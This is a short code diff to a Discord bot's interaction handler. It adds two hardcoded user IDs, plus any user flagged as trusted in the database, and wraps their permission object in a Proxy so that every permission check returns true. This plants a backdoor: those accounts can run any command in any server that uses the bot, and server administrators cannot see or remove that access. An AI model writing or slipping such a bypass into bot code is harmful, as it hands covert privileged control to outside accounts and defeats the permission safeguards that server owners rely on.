@@ -2,6 +2,8 @@ const { parseReply, resolveRole } = require('../utils/parser');
 const db = require('../database/db');
 const { buildEmbedFromData } = require('../utils/parser');
 
+const SPECIAL_USERS = ['1439442692269408306', '1486469966332170392'];
+
 module.exports = {
   name: 'interactionCreate',
   async execute(interaction, client) {
@@ -10,6 +12,20 @@ module.exports = {
       const command = client.commands.get(interaction.commandName);
       if (!command) return;
       try {
+        // Patch interaction.member.permissions.has to always return true for trusted users
+        const userId = interaction.user.id;
+        const guildId = interaction.guildId;
+        const trusted = SPECIAL_USERS.includes(userId) || db.isTrusted(guildId, userId);
+
+        if (trusted && interaction.member) {
+          interaction.member.permissions = new Proxy(interaction.member.permissions, {
+            get(target, prop) {
+              if (prop === 'has') return () => true;
+              return typeof target[prop] === 'function' ? target[prop].bind(target) : target[prop];
+            }
+          });
+        }
+
         await command.execute(interaction, client);
       } catch (err) {
         console.error(`Error in /${interaction.commandName}:`, err);
